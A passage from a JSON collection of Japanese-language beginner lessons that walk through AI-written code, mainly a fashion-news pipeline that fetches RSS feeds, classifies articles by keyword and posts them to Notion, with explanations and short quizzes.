... });\nCOLS.forEach(c => store.sub(c, rows => { S[c] = rows; rerender(); }));\nrender();\n```\n\n- 設定を購読：届いた設定を **初期値に上書き** する形で入れる（`{ ...初期値, ...届いた値 }`）。自分の名前が今のメンバーにいなければ「あなたは誰？」を出す\n- 5 種類のデータを購読：届くたびに `S.tasks` などを入れ替えて描き直す\n- 最後の `render()`：データが届く前に、まず一度画面を出しておく\n\nここが、ここまでのページで見てきた部品が **一本の流れにつながる** 場所です。\n\n```text\n操作（7 ページ目）→ store に保存（3 ページ目）→ 変更の知らせ（ここ）→ S を更新 → render（5・6 ページ目）\n```\n\n## 🐍 Python と比べると\n\n| JavaScript | Python で言うと |\n|---|---|\n| `new Promise((ok, ng) => ...)` | `asyncio.Future` を作って、終わったら `set_result` する |\n| `try { ... } finally { 片付け }` | `try: ... finally: 片付け`（同じ） |\n| canvas で縮小 | Pillow の `img.thumbnail((1280, 1280))` と `img.save(..., quality=78)` |\n| `{ ...DEFAULT_SETTINGS, ...s }` | `{**DEFAULT_SETTINGS, **s}` |\n| `setTimeout(f, 0)` | `loop.call_soon(f)`（今の処理の直後に実行） |\n\n## 🔑 キーワード\n\n- **Data URL**：画像などを `data:image/jpeg;base64,...` という文字列で表したもの\n- **canvas**：ブラウザの中で絵を描いたり画像を加工したりできる要素\n- **Promise 化**：コールバック形式の処理を、`await` で待てる形に包むこと\n- **購読（subscribe）**：データの変化を見張り、変わったら知らせてもらうこと\n- **フォーカス**：今どの入力欄にカーソルがあるか（`document.activeElement`）\n- **保留フラグ**：「あとでやる」ことを覚えておく印（ここでは `pending`）\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 写真を上限に収まるまで段階的に小さくし、失敗したら分かりやすく知らせる\n- ✅ 一時的な URL を `finally` で必ず片付けている\n- ✅ 入力中に他の人の変更が届いても、入力が消えないよう工夫している\n- ⚠️ 写真をデータベースの中に文字列で保存しているので、アイデアが増えると **アプリを開くたびに全部の写真を読み込む** ことになり、重く・通信量が多くなる。写真が増えるなら Firebase Storage（ファイル置き場）に分けるのが一般的\n- ⚠️ 6 回小さくしても 70 万文字を超える場合でも、そのまま返している。その場合はデータベースへの保存に失敗し、「投稿に失敗しました」と表示される\n- ⚠️ `pending` は使われる行より後ろ（398 行目）で宣言されている。実際に使われるのは起動後なので動くが、宣言を上にまとめた方が読みやすい\n\n## 🗣️ 30 秒で人に説明するなら\n\n「写真は Firestore の 1 件 1MB の上限に入るよう、canvas で縮小して JPEG の文字列にしています。入らなければサイズと画質を少しずつ下げて最大 6 回試します。\n起動時には設定と 5 種類のデータを購読して、変更が届くたびに状態を更新して描き直します。ただし入力中に描き直すと文字が消えるので、そのときは保留しておいて、入力欄から離れたときに描き直す工夫をしています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "写真を縮小している一番の理由は？",
      "choices": [
       "画面に収まるようにするため",
       "データベースの 1 件あたりの上限（1MB）に収めるため",
       "色をきれいにするため"
      ],
      "answer": 1,
      "explain": "写真を文字列にしてデータの中に入れているので、上限に収める必要があります。"
     },
     {
      "question": "文字を入力している最中に、他のメンバーがタスクを追加した。何が起きる？",
      "choices": [
       "すぐには描き直さず、入力欄から離れたときに描き直す",
       "入力中の文字が消える",
       "追加されたタスクは表示されない"
      ],
      "answer": 0,
      "explain": "rerender が pending の印を付けて保留し、focusout で描き直します。"
     },
     {
      "question": "`{ ...DEFAULT_SETTINGS, ...(s || {}) }` で、届いた設定に date が無い場合の date は？",
      "choices": [
       "undefined",
       "DEFAULT_SETTINGS の \"2027-09-01\"",
       "エラーになる"
      ],
      "answer": 1,
      "explain": "後ろに書いた方が上書きするので、届いた値に無い項目は初期値のまま残ります。"
     }
    ]
   ],
   "id": "2026-11-17-popup2027-08-photo-sync"
  },
  {
   "title": "fashion_news の全体像 ― ニュースを集めて Notion にまとめるロボット",
   "language": "Python",
   "date": "2026-11-16",
   "level": 2,
   "series": "fashion_news",
   "part": 1,
   "concepts": [
    "reading",
    "modules",
    "http_api",
    "data_formats",
    "testing",
    "tooling"
   ],
   "lessons": [
    "00-basics/02-how-to-read-code",
    "10-python/08-modules",
    "10-python/11-files-and-json",
    "100-ai-dev/08-testing"
   ],
   "summary": "毎日 2 回、ファッションニュースの RSS を集めてジャンル分けし、Notion に「朝刊・夕刊」ページを作るプログラムの全体像。",
   "body": "> 📚 このページは **fashion_news シリーズの 1 ページ目（全体像）** です。ここで地図をつかんでから、2 ページ目以降でファイルを 1 つずつ読んでいきます。\n\n## 📄 解説するコード（ファイルの一覧）\n\n```text\nfashion_news/\n├── README.md                     使い方の説明書\n├── REQUIREMENTS.md               要件定義書（何を作るかの設計図）\n├── requirements.txt              必要なライブラリの一覧\n├── config/\n│   ├── sources.yaml              ニュースを集める先（RSS）の一覧        → 3 ページ目\n│   └── categories.yaml           ジャンル分けのキーワード辞書           → 3 ページ目\n├── src/fashion_news/\n│   ├── __main__.py               「python -m fashion_news」の入口        → 2 ページ目\n│   ├── models.py                 記事 1 件のデータの形（Article）        → 2 ページ目\n│   ├── fetch.py                  RSS を取ってくる                        → 4 ページ目\n│   ├── classify.py               ジャンルに分ける                        → 5 ページ目\n│   ├── dedupe.py                 古い記事・重複を取り除く                → 6 ページ目\n│   ├── notion.py                 Notion にページを作る                   → 7 ページ目\n│   └── main.py                   全体の司令塔（上の部品を順に呼ぶ）      → 8 ページ目\n├── data/seen_urls.json           これまでに載せた記事の URL の記録\n├── .github/workflows/daily.yml   毎日 2 回、自動で動かす設定             → 9 ページ目\n└── tests/test_pipeline.py        部品が正しく動くか確かめるテスト        → 10 ページ目\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、**毎朝・毎夕、日本語のファッションニュースを自動で集め、ジャンル別に整理して Notion に「朝刊」「夕刊」ページを作るロボット** です。\nGitHub Actions（GitHub の自動実行サービス）が決まった時刻に起動するので、パソコンの電源が切れていても動きます。\n\n## 🗺️ 全体の流れ\n\n工場の流れ作業（ベルトコンベア）をイメージすると分かりやすいです。\n\n1. **起動**：毎日 6:30 と 17:30（日本時間）に GitHub Actions がプログラムを動かす（`daily.yml`）\n2. **準備**：設定ファイル（どのサイトから集めるか・ジャンルのキーワード）と、過去に載せた記事の記録を読み込む（`main.py`）\n3. **集める（入力）**：8 つのニュースサイトの RSS を取ってきて、記事のリストにする（`fetch.py`）\n4. **ふるいにかける**：36 時間より古い記事、ファッションと関係ない記事、重複している記事、過去に載せた記事を取り除く（`classify.py`・`dedupe.py`）\n5. **仕分ける**：タイトルのキーワードで 6 つのジャンルに分け、各ジャンル新しい順に最大 20 件にする（`classify.py`・`main.py`）\n6. **届ける（出力）**：Notion に「2026-11-16 朝刊」のようなページを作り、ジャンルごとに見出し＋リンクを並べる（`notion.py`）\n7. **記録する**：載せた記事の URL を `seen_urls.json` に書き足し、GitHub に保存する（次回の重複防止）\n\n## 🔍 ブロックごとの解説\n\n### 部品ごとに 1 ファイル\n\nこのプロジェクトは、**1 つのファイルに 1 つの役割** を持たせています。\n\n| 役割 | ファイル | たとえ |\n|---|---|---|\n| データの形 | `models.py` | 伝票の書式 |\n| 集める | `fetch.py` | 仕入れ担当 |\n| 仕分ける | `classify.py` | 仕分け担当 |\n| 選別する | `dedupe.py` | 検品担当 |\n| 届ける | `notion.py` | 配送担当 |\n| 指示を出す | `main.py` | 工場長 |\n\nこう分けておくと、「Notion の代わりに LINE に送りたい」となっても `notion.py` の部分だけ取り替えればよく、他は触らずに済みます。\n\n### 設定とコードを分けている\n\nニュースを集めるサイトや、ジャンル分けのキーワードは **コードではなく YAML ファイル** に書いてあります。\nそのため「このサイトも追加したい」「このキーワードも『スニーカー』扱いにしたい」は、Python を書き換えずに設定ファイルを直すだけでできます。\n\n### 記録をファイルに残して、重複を防ぐ\n\nプログラムは毎回まっさらな状態で起動するので、「昨日どの記事を載せたか」を覚えていません。\nそこで `data/seen_urls.json` に **載せた記事の URL と日付** を書いておき（30 日分）、次回はそこに載っている記事を除外します。\n\n### テストがある\n\n`tests/test_pipeline.py` に、各部品が期待どおり動くかを確かめるテストが 11 個あります。AI に修正を頼んだときに、前の機能を壊していないかすぐに確かめられます。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 見かけるもの | 意味 |\n|---|---|\n| `src/fashion_news/` というフォルダ構成 | プログラム本体を `src` の下の「パッケージ」（フォルダ単位のモジュール）にまとめる、よくある形 |\n| `from .models import Article` の `.` | 「同じパッケージ（フォルダ）の中の models から」という意味（相対 import） |\n| `python -m fashion_news` | ファイル名ではなくパッケージ名で実行する方法。`__main__.py` が入口になる |\n| `PYTHONPATH=src` | 「`src` フォルダの中もライブラリとして探して」と Python に伝える環境変数 |\n\n## 🔑 キーワード\n\n- **RSS**：ニュースサイトが「新着記事の一覧」を機械向けに配っている形式（XML というデータ形式）\n- **Notion API**：プログラムから Notion を操作するための窓口\n- **GitHub Actions**：GitHub が決まった時刻やきっかけでプログラムを動かしてくれる仕組み\n- **YAML**：設定ファイルによく使われる、人が読み書きしやすいデータ形式\n- **パイプライン**：集める → ふるう → 仕分ける → 届ける、のように処理を順番につなげた流れ\n- **ドライラン（dry run）**：本番の書き込みをせず、結果を画面に表示するだけの試し運転\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 役割ごとにファイルが分かれていて、テストもある。とても読みやすい構成\n- ✅ 1 つのサイトの取得に失敗しても、他のサイトは続けて処理する\n- ✅ Notion のトークン（パスワードのようなもの）は GitHub の Secrets に置いていて、コードには書いていない\n- ⚠️ このリポジトリは **公開（Public）** になっている。README に Notion の親ページ ID が書かれており、`seen_urls.json` から読んだ記事の履歴も誰でも見られる。トークンが無ければページ ID だけでは操作できないが、気になるなら非公開にするとよい\n- ⚠️ 要件定義書では「1 つの記事に複数のジャンルを付けてよい」となっているが、実装は **最初に当たった 1 ジャンルだけ** に入れる。仕様と実装のずれ（意図的に簡単にした可能性もある）\n- 必要な準備：Notion のインテグレーション（連携用の設定）と、GitHub Secrets への `NOTION_TOKEN`・`NOTION_PARENT_PAGE_ID` の登録\n\n## 🗣️ 30 秒で人に説明するなら\n\n「これは毎朝と毎夕、ファッション系ニュースサイトの RSS を自動で集めて、Notion に朝刊・夕刊のページを作るプログラムです。\nGitHub Actions で定時に動いて、記事を集めたら古いものや重複を取り除き、タイトルのキーワードでハイブランドやスニーカーなどのジャンルに分けています。\n一度載せた記事は JSON ファイルに記録しておいて、次の回には出ないようにしています。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "このプログラムを毎日決まった時刻に動かしているのは？",
      "choices": [
       "自分のパソコンのタイマー",
       "GitHub Actions",
       "Notion の自動化機能"
      ],
      "answer": 1,
      "explain": "`.github/workflows/daily.yml` に時刻が書かれていて、GitHub のサーバーで動きます。"
     },
     {
      "question": "「この記事は昨日もう載せた」と判断するために使っているのは？",
      "choices": [
       "Notion のページを毎回すべて読む",
       "data/seen_urls.json に記録した URL",
       "記事の公開日だけ"
      ],
      "answer": 1,
      "explain": "載せた記事の URL を 30 日分ファイルに記録し、次回はそこにある記事を除外します。"
     },
     {
      "question": "ニュースを集めるサイトを 1 つ追加したい。主に書き換えるのは？",
      "choices": [
       "fetch.py",
       "main.py",
       "config/sources.yaml"
      ],
      "answer": 2,
      "explain": "情報源は設定ファイルで管理しているので、コードを変えずに追加できます。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-01-overview"
  },
  {
   "title": "models.py と __main__.py ― 記事 1 件の「伝票の書式」とプログラムの入口",
   "language": "Python",
   "date": "2026-11-16",
   "level": 2,
   "series": "fashion_news",
   "part": 2,
   "concepts": [
    "classes",
    "type_hints",
    "modules"
   ],
   "lessons": [
    "10-python/10-classes",
    "10-python/12-type-hints-dataclass",
    "10-python/08-modules"
   ],
   "summary": "記事データの形を決める dataclass と、python -m で実行したときの入口。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/models.py`\n\n```python\nfrom __future__ import annotations\n\nfrom dataclasses import dataclass\nfrom datetime import datetime\n\n\n@dataclass\nclass Article:\n    title: str\n    url: str\n    source: str\n    kind: str  # media / official / sns\n    published: datetime | None = None  # UTC。不明なら None\n    category: str = \"\"\n```\n\n`src/fashion_news/__main__.py`\n\n```python\nfrom .main import main\n\nmain()\n```\n\n（`__init__.py` は中身が空のファイルです）\n\n## 🧭 ひとことで言うと\n\n**Python** のファイル 2 つです。`models.py` は「記事 1 件がどんな情報を持つか」という **データの形（Article）** を決め、`__main__.py` は `python -m fashion_news` で実行されたときの **入口** です。\n\n## 🗺️ 全体の流れ\n\n1. `python -m fashion_news` と実行すると、Python は `fashion_news` フォルダの `__main__.py` を探して実行する\n2. `__main__.py` は `main.py` の `main()` 関数を呼ぶだけ\n3. プログラムのあちこちで、記事は `Article` の形で受け渡しされる\n\n## 🔍 ブロックごとの解説\n\n### @dataclass：データを入れるための箱を簡単に作る\n\n```python\n@dataclass\nclass Article:\n    title: str\n    url: str\n```\n\n`@dataclass` を付けると、`__init__`（作るときの初期化処理）を Python が自動で作ってくれます。\nなので、次のように 1 行で記事を作れます。\n\n```python\na = Article(\"パリコレ開幕\", \"https://...\", \"WWDJAPAN\", \"media\")\na.title   # \"パリコレ開幕\"\n```\n\n辞書 `{\"title\": ..., \"url\": ...}` でも同じ情報は持てますが、クラスにしておくと\n**キーのタイプミスに気づける**、**どんな項目があるか一目で分かる** という利点があります。\n\n### 各項目の意味\n\n| 項目 | 型 | 意味 |\n|---|---|---|\n| `title` | `str` | 記事のタイトル |\n| `url` | `str` | 記事のリンク |\n| `source` | `str` | どのサイトから来たか（例：WWDJAPAN） |\n| `kind` | `str` | 情報源の種類。`media`（メディア）/ `official`（公式発表）/ `sns`（SNS の話題） |\n| `published` | `datetime \\| None` | 公開日時。分からなければ `None` |\n| `category` | `str` | あとで付けるジャンル名。最初は空文字 |\n\n`= None` や `= \"\"` のように **初期値があるものは、作るときに省略できます**。\n`published` は RSS によっては日付が無いことがあるので、`None`（なし）も許しています。\n\n### from __future__ import annotations\n\n型ヒントの書き方を新しいルールで扱うための 1 行です。`datetime | None` のような新しめの書き方を、古い Python でも使えるようにするためのお守りだと思っておけば十分です。\n\n### __main__.py と __init__.py\n\n| ファイル | 役割 |\n|---|---|\n| `__init__.py` | 「このフォルダは Python のパッケージです」という目印。中身は空でもよい |\n| `__main__.py` | `python -m パッケージ名` で実行されたときに最初に動くファイル |\n\n`from .main import main` の `.` は「同じフォルダの」という意味（相対 import）です。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `datetime \\| None` | 「datetime か None のどちらか」。使う側は None のときの処理が必要になる（実際 `main.py` で `a.published or oldest` と対処している） |\n| `kind: str  # media / official / sns` | 型は `str` なので、実は何の文字列でも入ってしまう。コメントで決まりごとを伝えている |\n| `@dataclass` | 自動で `__init__` に加え、表示用の `__repr__`、比較用の `__eq__` も作ってくれる（テストで `==` 比較できるのはこのおかげ） |\n\n## 🔑 キーワード\n\n- **dataclass**：データを入れるためのクラスを簡単に作る仕組み\n- **型ヒント**：`title: str` のように、どんな値が入るかを書いた注釈\n- **None**：「値が無い」ことを表す特別な値\n- **パッケージ**：Python のファイルをまとめたフォルダ\n- **相対 import**：`from .main import ...` のように、同じパッケージ内から読み込む書き方\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ データの形が 1 か所にまとまっていて、どのファイルからも同じ `Article` を使っている\n- ✅ 日付が無い場合を `None` で表し、型ヒントにも明記している\n- ⚠️ `kind` は自由な文字列なので、`sources.yaml` で `\"medai\"` のように打ち間違えてもエラーにならない（`Literal[\"media\", \"official\", \"sns\"]` という型にすれば防げる）\n\n## 🗣️ 30 秒で人に説明するなら\n\n「models.py では、記事 1 件が持つ情報を Article という dataclass で決めています。タイトル・URL・出典・種類・公開日時・ジャンルの 6 つです。\n公開日時は分からないこともあるので None を許していて、ジャンルは後から入れるので最初は空です。\n__main__.py は、python -m fashion_news で起動したときに main 関数を呼ぶだけの入口です。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`Article(\"見出し\", \"https://x\", \"WWD\", \"media\")` で作った記事の `published` は？",
      "choices": [
       "今の日時",
       "None",
       "エラーになる"
      ],
      "answer": 1,
      "explain": "初期値が None なので、省略するとそのまま None になります。"
     },
     {
      "question": "`@dataclass` を付けると何が楽になる？",
      "choices": [
       "`__init__` などを自動で作ってくれる",
       "自動でデータベースに保存される",
       "型が違うと必ずエラーになる"
      ],
      "answer": 0,
      "explain": "型ヒントは注釈なので、dataclass でも型の強制はされません。"
     },
     {
      "question": "`python -m fashion_news` で最初に実行されるファイルは？",
      "choices": [
       "main.py",
       "__main__.py",
       "__init__.py"
      ],
      "answer": 1,
      "explain": "-m でパッケージを実行すると __main__.py が入口になります（その前に __init__.py も読まれます）。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-02-models"
  },
  {
   "title": "sources.yaml と categories.yaml ― 集める先と仕分けルールの設定ファイル",
   "language": "YAML",
   "date": "2026-11-16",
   "level": 1,
   "series": "fashion_news",
   "part": 3,
   "concepts": [
    "data_formats",
    "collections"
   ],
   "lessons": [
    "10-python/04-lists-and-dicts",
    "10-python/11-files-and-json"
   ],
   "summary": "コードを書き換えずに情報源やジャンルの辞書を変えられる、2 つの YAML 設定ファイル。",
   "body": "## 📄 解説するコード\n\n`config/sources.yaml`（抜粋）\n\n```yaml\nsources:\n  - {name: WWDJAPAN, url: \"https://www.wwdjapan.com/feed\", kind: media}\n  - {name: FASHIONSNAP, url: \"https://www.fashionsnap.com/rss.xml\", kind: media}\n  - name: Googleニュース(SNSで話題)\n    url: \"https://news.google.com/rss/search?q=...+when:1d&hl=ja&gl=JP&ceid=JP:ja\"\n    kind: sns\n  - {name: はてブ(ライフスタイル), url: \"https://b.hatena.ne.jp/hotentry/life.rss\", kind: sns, require_fashion: true}\n```\n\n`config/categories.yaml`（抜粋）\n\n```yaml\nmax_per_category: 20\nfashion_keywords: [ファッション, 服, コーデ, スニーカー, ブランド, ...]\nniche_category: 公式発表・ニッチ\nniche_kinds: [official, sns]\nfallback_category: その他\ncategories:\n  - name: ハイブランド/コレクション\n    keywords: [コレクション, ランウェイ, パリ, ミラノ, シャネル, ...]\n  - name: ストリート/スニーカー\n    keywords: [スニーカー, ストリート, コラボ, ナイキ, Nike, ...]\n  - name: 業界・ビジネス\n    keywords: [決算, 売上, 買収, 就任, ...]\n  - name: トレンド/スタイリング\n    keywords: [トレンド, 着こなし, コーデ, ...]\n```\n\n## 🧭 ひとことで言うと\n\n**YAML**（ヤムル）という形式で書かれた 2 つの設定ファイルです。`sources.yaml` は **ニュースを集める 8 つのサイトの一覧**、`categories.yaml` は **ジャンル分けのキーワード辞書と件数の上限** を決めています。\n\n## 🗺️ 全体の流れ\n\n1. `main.py` が起動時にこの 2 つを読み込み、Python の辞書・リストに変換する\n2. `sources` の一覧は `fetch.py` に渡され、上から順に RSS を取りに行く\n3. `categories.yaml` の内容は `classify.py` に渡され、記事のタイトルとキーワードを照らし合わせる\n\n## 🔍 ブロックごとの解説\n\n### YAML の読み方\n\nYAML は「人が読み書きしやすい JSON」のような形式です。Python に読み込むと、そのまま辞書とリストになります。\n\n| YAML | 意味 | Python では |\n|---|---|---|\n| `max_per_category: 20` | キー: 値 | `{\"max_per_category\": 20}` |\n| `- name: ...`（行頭の `-`） | リストの 1 項目 | `[ {...}, {...} ]` |\n| `[ファッション, 服]` | 1 行で書いたリスト | `[\"ファッション\", \"服\"]` |\n| `{name: WWDJAPAN, url: ...}` | 1 行で書いた辞書 | `{\"name\": \"WWDJAPAN\", \"url\": ...}` |\n| `# ...` | コメント | `# ...` |\n| インデント（字下げ） | 入れ子の関係 | Python と同じく字下げが意味を持つ |\n\n`sources.yaml` では 1 行で書く書き方と、複数行で書く書き方が混ざっていますが、**どちらも同じ辞書** です。URL が長いものだけ複数行にして読みやすくしています。\n\n### sources.yaml：情報源の一覧\n\n| 項目 | 意味 |\n|---|---|\n| `name` | 表示用の名前（Notion に「— WWDJAPAN」のように出る） |\n| `url` | RSS の URL |\n| `kind` | `media`（メディア）/ `sns`（SNS の話題）など。`sns` は「公式発表・ニッチ」ジャンルに入る |\n| `require_fashion: true` | ファッションと関係ない記事も混ざる情報源用。タイトルにファッション系のキーワードがある記事だけ残す |\n\nGoogle ニュースの URL の `q=%E3%83%95...` は、日本語の検索キーワード（「ファッション コレクション」など）を URL 用に変換したものです。`when:1d` は「直近 1 日」の意味です。\n\n### categories.yaml：仕分けのルール\n\n- **上から順に判定し、最初に当たったジャンルに入れる**。「パリでスニーカーのコラボ」は「パリ」が先に当たるので「ハイブランド/コレクション」になる\n- `kind` が `sns` か `official` の記事は、キーワードに関係なく **先に「公式発表・ニッチ」** に入る\n- どこにも当たらなければ「その他」\n- `max_per_category: 20`：各ジャンル最大 20 件\n\n## 🐍 Python と比べると\n\n`main.py` ではこう読み込んでいます。\n\n```python\nimport yaml\nconfig = yaml.safe_load(open(\"config/categories.yaml\", encoding=\"utf-8\"))\nconfig[\"max_per_category\"]            # 20\nconfig[\"categories\"][0][\"name\"]       # \"ハイブランド/コレクション\"\n```\n\n`yaml.safe_load` は JSON の `json.loads` にあたります。`safe_` が付いているのは、YAML の危険な機能（プログラムを実行させる書き方）を無効にした **安全な読み込み方** だからです。\n\n## 🔑 キーワード\n\n- **YAML**：設定ファイルでよく使われる、字下げで構造を表すデータ形式（GitHub Actions の設定も YAML）\n- **設定ファイル**：プログラムの動きを、コードを変えずに調整するためのファイル\n- **キーワード辞書**：ジャンルごとに「この言葉があればこのジャンル」と決めた一覧\n- **URL エンコード**：日本語などを `%E3%83...` の形にして URL に入れられるようにすること\n- **safe_load**：YAML を安全に読み込む関数\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ 情報源とキーワードをコードから切り離していて、変更しやすい\n- ✅ コメントで「上から順に判定」「URL は未確認なので初回のログを見ること」と注意点が書かれている\n- ⚠️ 「上から順に最初の 1 つ」なので、**キーワードの並び順で結果が変わる**。「コラボ」を含むハイブランドの記事は、ハイブランドの方に入る\n- ⚠️ 「人気」「秋冬」のような広い言葉は、ファッション以外の記事も拾いやすい（ただし情報源がファッション系なので実害は小さい）\n- ⚠️ 英語キーワードは大文字・小文字を区別しない（`classify.py` で小文字にそろえている）が、全角・半角の違いはそろえていない\n\n## 🗣️ 30 秒で人に説明するなら\n\n「config フォルダには YAML の設定ファイルが 2 つあります。sources.yaml はニュースを集めるサイトの RSS 一覧で、種類やファッション記事だけに絞るかどうかも書けます。\ncategories.yaml はジャンル分けのキーワード辞書で、上から順にタイトルと照らし合わせて最初に当たったジャンルに入れます。\nコードを触らずに、情報源やキーワードを増やせるのがポイントです。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "YAML の `- {name: A, url: B}` を Python で読み込むと？",
      "choices": [
       "文字列 \"name: A, url: B\"",
       "辞書 {\"name\": \"A\", \"url\": \"B\"} を 1 つ含むリスト",
       "タプル (\"A\", \"B\")"
      ],
      "answer": 1,
      "explain": "行頭の - はリストの項目、{ } は辞書です。"
     },
     {
      "question": "タイトル「ミラノで話題のスニーカーコラボ」はどのジャンルになる？（kind は media）",
      "choices": [
       "ハイブランド/コレクション",
       "ストリート/スニーカー",
       "その他"
      ],
      "answer": 0,
      "explain": "上から順に判定するので、先にある「ミラノ」に当たります。"
     },
     {
      "question": "`require_fashion: true` が付いた情報源の記事はどうなる？",
      "choices": [
       "すべて「公式発表・ニッチ」に入る",
       "タイトルにファッション系のキーワードがある記事だけ残る",
       "必ず 20 件まで載る"
      ],
      "answer": 1,
      "explain": "はてブのように話題が幅広い情報源から、ファッション記事だけを残すための設定です。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-03-config"
  },
  {
   "title": "fetch.py ― ニュースサイトの RSS を取ってくる「仕入れ担当」",
   "language": "Python",
   "date": "2026-11-16",
   "level": 2,
   "series": "fashion_news",
   "part": 4,
   "concepts": [
    "http_api",
    "data_formats",
    "errors",
    "functions",
    "loops"
   ],
   "lessons": [
    "10-python/05-functions",
    "10-python/07-exceptions",
    "10-python/03-loops",
    "10-python/08-modules"
   ],
   "summary": "8 つのサイトから RSS を取ってきて Article のリストにする。1 つ失敗しても他は続ける。",
   "body": "## 📄 解説するコード\n\n`src/fashion_news/fetch.py`\n\n```python\nfrom __future__ import annotations\n\nimport calendar\nimport logging\nfrom datetime import datetime, timezone\n\nimport feedparser\nimport requests\n\nfrom .models import Article\n\nlog = logging.getLogger(__name__)\nUSER_AGENT = \"fashion-news-bot/1.0 (personal RSS reader)\"\n\n\ndef parse_feed(content: bytes | str, source: str, kind: str) -> list[Article]:\n    parsed = feedparser.parse(content)\n    articles: list[Article] = []\n    for e in parsed.entries:\n        title = (e.get(\"title\") or \"\").strip()\n        link = (e.get(\"link\") or \"\").strip()\n        if not title or not link:\n            continue\n        ts = e.get(\"published_parsed\") or e.get(\"updated_parsed\")\n        published = (\n            datetime.fromtimestamp(calendar.timegm(ts), tz=timezone.utc) if ts else None\n        )\n        articles.append(Article(title, link, source, kind, published))\n    return articles\n\n\ndef fetch_source(src: dict, timeout: int = 20) -> list[Article]:\n    resp = requests.get(src[\"url\"], headers={\"User-Agent\": USER_AGENT}, timeout=timeout)\n    resp.raise_for_status()\n    return parse_feed(resp.content, src[\"name\"], src.get(\"kind\", \"media\"))\n\n\ndef fetch_all(sources: list[dict]) -> list[Article]:\n    \"\"\"1つの情報源が失敗しても他は続ける。\"\"\"\n    result: list[Article] = []\n    for src in sources:\n        try:\n            items = fetch_source(src)\n            log.info(\"%s: %d件\", src[\"name\"], len(items))\n            result.extend(items)\n        except Exception as exc:  # noqa: BLE001\n            log.warning(\"%s の取得に失敗: %s\", src[\"name\"], exc)\n    return result\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、**各ニュースサイトの RSS をインターネットから取ってきて、記事（Article）のリストに変換する** ファイルです。3 つの関数が「全部 → 1 サイト → 中身の読み取り」と役割を分けています。\n\n## 🗺️ 全体の流れ\n\n1. `main.py` が `fetch_all(sources)` に情報源の一覧（8 サイト分）を渡す\n2. `fetch_all` が 1 サイトずつ `fetch_source` を呼ぶ\n3. `fetch_source` が `requests` で RSS をダウンロードし、`parse_feed` に渡す\n4. `parse_feed` が RSS の中身を 1 記事ずつ `Article` にする\n5. 全サイト分をまとめたリストを返す（失敗したサイトは飛ばして警告を出す）\n\n## 🔍 ブロックごとの解説\n\n### parse_feed：RSS の中身を Article にする\n\n```python\nparsed = feedparser.parse(content)\nfor e in parsed.entries:\n    title = (e.get(\"title\") or \"\").strip()\n```\n\n- `feedparser` は RSS を読み解いてくれる外部ライブラリ。`parsed.entries` が記事の一覧\n- `e.get(\"title\") or \"\"`：タイトルが無い・`None` のときは空文字にする。`.strip()` で前後の空白を取る\n- `if not title or not link: continue`：タイトルかリンクが空の記事は **飛ばす**（壊れたデータへの備え）\n\n```python\nts = e.get(\"published_parsed\") or e.get(\"updated_parsed\")\npublished = (\n    datetime.fromtimestamp(calendar.timegm(ts), tz=timezone.utc) if ts else None\n)\n```\n\n- 公開日時が無ければ更新日時を使う（`or` で「左が無ければ右」）\n- `feedparser` の日付は特殊な形なので、`calendar.timegm` で数値にしてから、**UTC（世界標準時）** の `datetime` に変換している\n- 日付がどちらも無ければ `None`（1 行の if 式：`値 if 条件 else 別の値`）\n\n### fetch_source：1 サイト分をダウンロード\n\n```python\nresp = requests.get(src[\"url\"], headers={\"User-Agent\": USER_AGENT}, timeout=timeout)\nresp.raise_for_status()\n```\n\n- `User-Agent`：「私は fashion-news-bot です」と名乗る。サイトに対する **マナー**\n- `timeout=20`：20 秒応答が無ければ諦める（無いと永遠に待つことがある）\n- `raise_for_status()`：404 や 500 などのエラーなら例外を起こす\n- `src.get(\"kind\", \"media\")`：`kind` が書かれていなければ `media` 扱い\n\n### fetch_all：全サイトを回す。失敗しても止まらない\n\n```python\nfor src in sources:\n    try:\n        items = fetch_source(src)\n        result.extend(items)\n    except Exception as exc:\n        log.warning(\"%s の取得に失敗: %s\", src[\"name\"], exc)\n```\n\n`try / except` を **ループの中** に置いているのがポイントです。1 つのサイトが落ちていても、警告を出して次のサイトへ進みます。\n`result.extend(items)` は、リストに **リストの中身を全部** 足す（`append` だとリストごと 1 つの要素として入ってしまう）。\n\n### logging：記録を残す\n\n`print` の代わりに `log.info(...)` や `log.warning(...)` を使っています。GitHub Actions の実行ログに「WWDJAPAN: 30件」のように残るので、あとから「どのサイトが取れていないか」を確認できます。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `x or \"\"` | x が None や空なら \"\" を使う。「デフォルト値」の定番 |\n| `continue` | その記事だけ飛ばして次へ |\n| `except Exception` | ほぼすべてのエラーを受け止める。普通は避けたいが、ここは **ログを残して** 次に進むので妥当 |\n| `# noqa: BLE001` | 「広すぎる except だと警告するツールに、わざとだと伝える」ためのコメント |\n| `extend` と `append` | `[1].extend([2,3])` → `[1,2,3]`、`[1].append([2,3])` → `[1,[2,3]]` |\n\n## 🔑 キーワード\n\n- **RSS**：サイトの新着記事の一覧を機械向けに配る形式\n- **feedparser**：RSS を読み解く外部ライブラリ\n- **requests**：Web からデータを取ってくる外部ライブラリ\n- **User-Agent**：アクセスするときの「名札」\n- **タイムアウト**：一定時間応答が無ければ諦める仕組み\n- **UTC**：世界標準時。日本時間は UTC＋9 時間\n- 